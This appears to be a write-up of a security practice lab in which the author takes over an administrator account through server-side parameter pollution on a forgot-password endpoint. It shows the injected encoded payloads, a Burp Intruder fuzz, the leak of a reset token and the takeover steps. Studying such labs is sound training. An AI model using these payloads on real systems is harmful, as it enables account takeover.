## 1. Initial reconnaissance

I inspected all endpoints containing parameters: -
`/product?productId=1` - `/login` (POST) - `/forgot-password` (POST)

Only `/forgot-password` produced unusual behavior when injecting encoded
characters.

---

## 2. Testing methodology

### Step 1. Inject encoded ampersand

```jsx
username=administrator%26x=y
```

→ "Parameter is not supported"
Confirmed internal API interprets `x=y`.

### Step 2. Inject encoded hash

```jsx
username=administrator%23
```

→ "Field not specified"
Confirmed server uses a `field` parameter internally.

### Step 3. Add field parameter

```jsx
username=administrator%26field=x%23
```

→ "Invalid field"
Indicates that `field` is recognized.

---

## 3. Payload construction

Used Burp Intruder:

```jsx
username=administrator%26field=§x§%23
```

Payload source: - Intruder → Add from list → *Server-side variable
names*

Results showed: - `field=email` returns 200 - `field=username` returns
200

**Extraction of Reset Token**

Found client JavaScript referencing:

```jsx
/forgot-password?reset_token=${resetToken}
```

Injected:

```jsx
username=administrator%26field=reset_token%23
```

Server returned admin's reset token.

## **4. Completing the attack**

1. Visit:
    
    ```jsx
    /forgot-password?reset_token=<token>
    ```
    
2. Reset admin password.
3. Log in as `administrator`.
4. Delete `carlos`.

---

forgot password

![image.png](attachment:477bff82-8a13-4925-83af-cab29b801c35:image.png)

GET /forgot-password?reset_token=radky9fhejx40fihjomim9z53x85sir0

![image.png](attachment:4a66359e-efe5-42f5-a3ad-40db65fa626a:image.png)

![image.png](attachment:ade79b04-4097-4509-b69e-4501dda179cd:image.png)

![image.png](attachment:fe0e4023-a35a-43a8-8b88-23711f3a01d0:image.png)

![image.png](attachment:eeffdfba-944c-4aee-bd11-85c3d20551c4:image.png)
